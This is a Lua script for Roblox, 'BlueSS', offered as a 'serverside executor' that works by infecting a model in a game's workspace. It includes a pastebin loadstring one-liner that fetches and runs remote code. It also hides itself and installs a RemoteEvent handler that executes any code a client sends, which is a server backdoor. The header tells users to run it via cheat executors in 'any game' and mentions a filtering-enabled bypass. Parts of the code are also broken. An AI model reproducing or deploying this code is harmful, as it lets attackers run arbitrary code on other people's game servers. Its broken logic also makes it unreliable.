--[[__  _             _____ _____ 
 |  _ \| |           / ____/ ____|
 | |_) | |_   _  ___| (___| (___  
 |  _ <| | | | |/ _ \\___ \\___ \ 
 | |_) | | |_| |  __/____) |___) |
 |____/|_|\__,_|\___|_____/_____/  PREMIUM
 
-- Credits
 > Made by bIue#2958

-- Simplified script
 > loadstring(game:HttpGet("https://pastebin.com/raw/TXerSEU7"))()

-- Information
 > "BlueSS" is an SS executor, made in only one execution.
 > The script makes a UI from Instance.new to make the UI.
 > Scripts are executed from "RemoteService" loadstrings
 
-- Serverside
 > Serverside/SS means the script / exploit is visible to everyone in the server.
 > The serverside works from infecting a model inside the workspace
 > The UI only consists of a script workspace and an executor.

-- Usage
 > Get any executor (KRNL, Synapse X, etc.)
 > Find the simplified script above
 > Execute this or the simplified script in any game
 > Use it like any other executor
 
-- Settings ]]

-- Customization
Theme = Color3.fromRGB(255, 255, 255) -- Chooses the color theme for the UI (RGB)
UIFont = "Gotham" -- Chooses the font for the UI
AutosetTheme = true -- Resets theme everytime executed if enabled (true/false)

-- General
Bootstrap = true -- Runs the bootstrapper if enabled (true/false)
Notifications = true -- Notifications show in console (Errors, successes, etc.)
ReturnExecutor = false -- Only bootstraps if using executor and enabled (true/false)
force_load = false -- Forces to bootstrap executor even if it was already executed (true/false)
AddMissingObjects = true -- Adds missing required objects if enabled (true/false)

-- Global properties
FE_netless = true -- Runs FE netless bypass (true/false)

-- Script
print("Note: Running BlueSS executor in",script.Parent,"(ServerScriptStorage.game)")

local Remote = game:GetService("ReplicatedStorage"):WaitForChild("exec")
local current_time = tick()

function Error(str)
	if Notifications == true then
		print("Error:",str)
	end
end

function Success(str)
	if Notifications == true then
		print("Success:",str)
	end
end

function Note(str)
	if Notifications == true then
		print("Note:",str)
	end
end

script.Parent = nil

Remote.OnServerEvent:Connect(function(Player, Code)
	loadstring(Code)()
	Success("Executed script")
end)

-- Functions

function CheckForEvent(event,item) -- Checks for an item in-game
	if event then
		Success(str,"enabled")
	else
		Error(str,"missing; Instancing")
		if AddMissingObjects == true then
			if item == "Remote" then
				Instance.new("RemoteEvent",game.ReplicatedStorage)
			end
			if item == "UI" then
				Instance.new("ScreenGui",game.StarterGui)
			end
		else
			Error("AddMissingObjects disabled, executor may not work")
		end
	end
end

local find_frame = game.StarterGui:FindFirstChild("ScreenGui")

function Check() -- Checks for required objects in-game
	local find_remote = game.ReplicatedStorage:FindFirstChild("RemoteEvent")
	-- Checks for events
	CheckForEvent(find_frame,"UI")
	CheckForEvent(find_remote,"Remote")
	-- Finds RemoteEvent
	if find_remote then
		Success("RemoteEvent added")
	else
		Error("RemoteEvent missing: Scripts may not execute")
	end
	-- Finds ScreenGui
	if find_frame then
		Success("ScreenGui added")
		Error("ScreenGui missing: Executor may not show")
	end
end

Check()

-- CONFIG > UI

local XUI = game.StarterGui.ScreenGui:FindFirstChild("Executor")

function Bootstrapper(executor) -- Bootstraps UI
	-- Checks if already executed
	if XUI and force_load == false then
		Error("Already executed")
		local sg = game.StarterGui.ScreenGui
		local UI = sg.Executor
		if AutosetTheme == true then
			UI.Workspace.Font = UIFont
			UI.Execute.Font = UIFont
			UI.Label.Font = UIFont
			UI.Workspace.BackgroundColor3 = Theme
			UI.Execute.BackgroundColor3 = Theme
			UI.BackgroundColor3 = Theme
		end
	else	
		Success("Starting bootstrapper")
		-- Setting "sg" and "UI" variables
		local sg = game.StarterGui.ScreenGui
		Instance.new("Frame",sg)
		sg.Frame.Name = "Executor"
		local UI = sg.Executor
		-- Instancing
		Instance.new("TextBox",UI)
		Instance.new("TextButton",UI)
		Instance.new("TextLabel",UI)
		-- Setting names
		UI.TextBox.Name = "Workspace"
		UI.TextButton.Name = "Execute"
		UI.TextLabel.Name = "Label"
		-- Setting properties
		UI.Workspace.Font = UIFont
		UI.Execute.Font = UIFont
		UI.Label.Font = UIFont
		UI.Workspace.BackgroundColor3 = Theme
		UI.Execute.BackgroundColor3 = Theme
		UI.BackgroundColor3 = Theme
		-- Setting UI position
		UI.AnchorPoint = Vector2.new(60, 60)
		UI.Position = UDim2.new(100, 100, 100, 100)
		-- Checking executor
		if executor == "KRNL" then
			Note("Running in executor")
		else
			Note("Running in workspace")
		end
		Success("Bootstrapped executor")
	end
end

-- Bootstrapper

if ReturnExecutor == true and Bootstrap == true then -- Only runs if bootstrapper enabled and running in executor
	if KRNL_LOADED then -- Only runs if using KRNL
		Bootstrapper("KRNL")
	else
		Error("Unsupported exploit")
	end
else
	if Bootstrap == true then -- Only runs if bootstrap is enabled
		Bootstrapper("Workspace")
	else
		Error("Bootstrapper disabled")
	end
end

-- Extra

Success("End of scripts")
Note("Running extra scripts")

if FE_netless == true then -- Checks if FE should be enabled
	if ReturnExecutor == true and KRNL_LOADED then -- Checks if using executor
		Success("FE netless ran")
	else
		Error("FE netless bypass could not run: not running in executor")
	end
else
	Error("FE netless disabled: Some scripts might not work)")
end

local latency = tick()-current_time -- Gets time when script is fully executed

if Notifications == true then
	print("Latency:",latency)
end
